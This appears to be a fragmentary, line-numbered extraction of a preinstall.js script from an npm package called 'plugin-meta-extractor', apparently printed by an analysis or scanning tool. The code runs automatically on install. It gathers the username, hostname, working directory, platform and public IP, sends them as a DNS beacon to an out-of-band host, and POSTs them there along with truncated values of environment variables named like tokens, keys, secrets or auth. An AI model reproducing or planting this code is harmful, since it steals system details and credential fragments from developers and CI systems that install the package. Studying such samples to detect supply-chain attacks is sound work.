// File: tmp/tmpqqwphkj9/plugin-meta-extractor/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const http = require('http')
Line 4: const https = require('https')
Line 11: Buffer.from(str).toString('hex')
Line 17: {
      const payload = JSON.stringify(data);
      const req = http.request({
        hostname: OAST,
        port: 80,
        path: path,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
          'User-Agent': 'curl/7.79', 
        },
        timeout: 5000,
      }, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      });

      req.on('error', resolve);
      req.on('timeout', () => { req.abort(); resolve(); });

      req.write(payload);
      req.end();
    }
Line 19: const req = http.request({
        hostname: OAST,
        port: 80,
        path: path,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
          'User-Agent': 'curl/7.79', 
        },
        timeout: 5000,
      }, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      })
Line 38: req.write(payload)
Line 39: req.end()
Line 49: (_tmp_6 = https.get('https://api.ipify.org', (res) => {
      let ip = '';
      res.on('data', chunk => ip += chunk);
      res.on('end', () => resolve(ip.trim()));
    }))
Line 52: ip.trim()
Line 57: {
  const info = {
    user: os.userInfo().username || 'nouser',
    host: os.hostname() || 'nohost',
    cwd: process.cwd(),
    platform: os.platform(),
    arch: os.arch(),
    timestamp: Date.now().toString(36),
  };

  // DNS Beacon
  let domainParts = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ];
  let domain = domainParts.join('.');
  if (domain.length > 253) domain = domain.slice(0, 253);
  dns.resolve(domain, () => {});

  // HTTPS IP fetch + HTTP Beacon
  const publicIp = await getPublicIp();
  const infoWithIp = { ...info, ip: publicIp, ci: !!process.env.CI };

  const leaked = Object.entries(process.env)
    .filter(([k]) => /token|key|secret|auth/i.test(k))
    .slice(0, 5)
    .reduce((acc, [k, v]) => ({ ...acc, [k]: v.slice(0, 12) + '...' }), {});

  const finalPayload = { systemInfo: infoWithIp };
  if (Object.keys(leaked).length) finalPayload.envLeak = leaked;

  await postData('/', finalPayload);
}
Line 59: os.userInfo()
Line 60: os.hostname()
Line 62: os.platform()
Line 63: os.arch()
Line 64: Date.now().toString(36)
Line 68: let domainParts = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ]
Line 69: domainParts.join('.')
Line 78: /token|key|secret|auth/i.test(k)
Line 83: Object.keys(leaked)
Line 85: postData('/', finalPayload)
